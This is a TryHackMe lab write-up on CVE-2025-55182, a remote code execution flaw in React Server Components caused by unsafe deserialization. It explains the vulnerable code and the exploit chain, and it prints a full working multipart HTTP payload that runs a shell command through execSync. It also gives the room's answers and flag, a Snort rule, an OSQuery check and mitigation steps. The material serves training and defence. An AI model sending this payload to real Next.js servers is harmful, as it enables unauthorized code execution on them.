# ğŸš¨ TryHackMe â€“ React2Shell: CVE-2025-55182 (DETAILED ROOM WRITE-UP)

---


![React2Shell Room Banner](https://tryhackme-images.s3.amazonaws.com/room-icons/5f04259cf9bf5b57aed2c476-1764954113748)

---

## ğŸ“Œ Room Overview

**Room Name:** React2Shell: CVE-2025-55182  
**Difficulty:** Advanced  
**Duration:** ~45 minutes  
**Category:** Web Exploitation / Recent Threats  
**Impact:** Unauthenticated Remote Code Execution (RCE)  
**CVSS Score:** 10.0 (Critical)

This room explores **CVE-2025-55182**, a critical vulnerability discovered in **December 2025** affecting **React Server Components (RSC)** and frameworks like **Next.js**.  
The flaw allows **unauthenticated attackers** to achieve **remote code execution** using a **single crafted HTTP request**.

---

## ğŸ¯ Learning Objectives

- Understand **React Server Components (RSC)**
- Learn how the **React Flight protocol** works
- Understand **unsafe deserialization**
- Analyse the **React2Shell exploitation chain**
- Perform **real-world RCE exploitation**
- Learn **detection & mitigation strategies**

---

## ğŸ§  Task 1 â€“ Introduction

React Server Components allow parts of a React application to run **entirely on the server**, improving performance by offloading heavy logic away from the browser.

However, this server-side execution model introduced a dangerous attack surface when **untrusted input** is deserialized incorrectly.

**Affected Versions:**
- React `19.0.0`
- React `19.1.0`
- React `19.1.1`
- React `19.2.0`

**Affected Packages:**
- `react-server-dom-webpack`
- `react-server-dom-parcel`
- `react-server-dom-turbopack`

âœ… **Patched Versions:**
- `19.0.1`
- `19.1.2`
- `19.2.1`

---

## ğŸ§© Task 2 â€“ React Server Components & Flight Protocol

React Server Components communicate with the client using a custom protocol called **React Flight**.

### ğŸ”¹ Key Concepts

- Client sends **serialized data**
- Server **deserializes and executes**
- Responses are streamed back to client
- Supports **Server Actions**

### ğŸ”¹ Special Flight Symbols

| Symbol | Meaning |
|------|--------|
| `$@` | Chunk reference |
| `$B` | Blob reference |
| `$Q` | Internal chunk pointer |

âœ… **Answer:**  
**Blob reference symbol:** `$B`

---

## ğŸ§ª Task 3 â€“ Core Vulnerability: Unsafe Deserialization

The vulnerability exists in the `requireModule()` function:

```js
function requireModule(metadata) {
  var moduleExports = __webpack_require__(metadata[0]);
  return moduleExports[metadata[2]]; // âŒ VULNERABLE
}
ğŸ”¥ Why This Is Dangerous

JavaScript allows prototype chain traversal when accessing properties with bracket notation.

An attacker can access:

js
Copy code
someFunction.constructor.constructor
Which resolves to the Function constructor, allowing execution of arbitrary JavaScript.

ğŸ§¨ Exploitable Reference

ruby
Copy code
$1:constructor:constructor
This lets attackers inject code directly into the server runtime.

ğŸ§¬ Task 4 â€“ Exploitation Chain Explained
Stage 1: Fake Chunk Injection
A malicious object mimics Reactâ€™s internal Chunk structure.

Stage 2: Prototype Chain Abuse
Using $1:__proto__:then to hijack execution flow.

Stage 3: Blob Handler Abuse
The $B handler calls:

js
Copy code
response._formData.get(...)
But _formData.get is overwritten to point to the Function constructor.

Stage 4: Remote Code Execution
Injected JavaScript executes via:

js
Copy code
process.mainModule.require('child_process').execSync(...)

ğŸ§ª Task 5 â€“ Proof-of-Concept Analysis
Key Headers
http
Copy code
Next-Action: x
Content-Type: multipart/form-data
These headers trigger React Server Action handling.

Multipart Payload Structure
Field	Purpose
0	Fake chunk object
1	Self-reference $@0
2	Required empty array

The payload abuses self-referential promises to force execution.

âš”ï¸ Task 6 â€“ Exploitation (Hands-On)
Target Details
IP: 10.64.141.111

Port: 3000

Framework: Next.js + React 19.2.0

Attack Tool: Burp Suite Repeater

ğŸ§¨ Exploit Payload (RCE)
http
Copy code
POST / HTTP/1.1
Host: 10.64.141.111:3000
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
http
Copy code
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString();throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
ğŸ† Exploitation Results
User running app: ubuntu

Command execution confirmed

Flag location: /etc
```

![React2Shell Room Banner](https://github.com/alhemdrew/Tryhackme_walkthrough/blob/main/Room/React2Shell%3A%20CVE-2025-55182/react.png)

THM{React-19.2.0}
```
ğŸ›¡ï¸ Task 7 â€“ Detection
ğŸ” Network Detection Indicators
Next-Action HTTP header

multipart/form-data

status: resolved_model

"$1:__proto__:then"

ğŸ§  Snort Rule (v3)
snort
Copy code
alert http any any -> $LAN_NETWORK any (
  msg:"Potential React2Shell CVE-2025-55182";
  content:"Next-Action"; http_header;
  content:"multipart/form-data"; http_header;
  pcre:"/\"then\":\"\\$1:__proto__:then\"/";
  classtype:web-application-attack;
  sid:6655001;
)
ğŸ§© OSQuery Detection
sql
Copy code
SELECT name, version, path
FROM npm_packages
WHERE name LIKE 'react-server-dom-%'
AND version IN ('19.0.0','19.1.0','19.1.1','19.2.0');
âœ… Task 8 â€“ Conclusion
React2Shell is a deserialization vulnerability

Requires no authentication

Works on default Next.js setups

Extremely reliable and dangerous

Proper patching fully mitigates the issue

ğŸ” Mitigation Steps
Upgrade React to patched versions

Restrict external access to RSC endpoints

Monitor unusual Next-Action requests

Apply WAF rules for multipart Flight payloads

ğŸ¯ Final Notes
âš ï¸ Never exploit systems without explicit permission.
This room is for educational and defensive awareness only.

ğŸ‰ Room Completed â€“ 100%

by Alhemdrew
